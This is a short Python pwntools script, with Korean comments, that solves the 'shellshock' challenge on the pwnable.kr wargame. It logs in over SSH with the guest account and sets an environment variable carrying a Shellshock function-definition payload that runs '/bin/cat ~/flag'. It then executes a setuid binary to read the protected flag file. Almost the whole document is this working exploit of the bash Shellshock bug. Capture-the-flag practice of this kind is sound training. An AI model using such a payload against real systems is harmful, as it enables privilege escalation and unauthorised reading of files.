from pwn import *

s = ssh(host="pwnable.kr", port=2222, user="shellshock", password="guest")

# 홈 디렉토리에 shellshock 취약점이 있는 bash가 있다
# 해당 bash를 실행하는 shellshock라는 바이너리가 있는데 setuid가 걸려있다.
# 환경변수에 shellshock 취약점을 발생하는 문자열과 flag를 출력하는 명령어를 적어 실행시킨다.
print(s.run_to_end("export x='() { :; }; /bin/cat ~/flag'; ./shellshock"))
